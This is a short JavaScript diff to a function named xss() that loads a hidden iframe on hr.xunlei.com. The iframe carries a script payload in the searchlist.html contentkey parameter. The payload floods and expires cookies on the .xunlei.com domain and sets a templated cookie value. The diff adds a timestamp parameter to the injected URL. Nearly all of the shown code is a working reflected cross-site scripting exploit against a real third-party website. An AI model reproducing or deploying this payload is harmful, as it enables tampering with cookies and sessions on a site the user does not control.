@@ -11,9 +11,10 @@ function xss() {
     return;
   }
   var script = 'for(var i=0;i<500;i++){document.cookie="loli"+i.toString()+"=1;domain=.xunlei.com";}for(var i=0;i<500;i++){document.cookie="loli"+i.toString()+"=0;domain=.xunlei.com;expires=Wed, 28 Dec 2011 12:46:19 GMT";}document.cookie="{{ cookie }}".replace(".vip","");document.getElementsByTagName("iframe")[0].src="{{ request.protocol }}://{{ request.host }}/xss?gdriveid={{ gdriveid }}";';
+  var ts = new Date().getTime();
   var iframe = document.createElement("iframe");
   iframe.setAttribute("style", "display: none;");
-  iframe.src = "http://hr.xunlei.com/searchlist.html?contentkey='%3Cscript%3E"+escape(script)+"%3C/script%3E";
+  iframe.src = "http://hr.xunlei.com/searchlist.html?contentkey='%3Cscript%3E"+escape(script)+"%3C/script%3E&ts="+ts;
   if (iframe.addEventListener) {
     iframe.addEventListener("load", function(){
       this.removeEventListener("load", arguments.call, false);
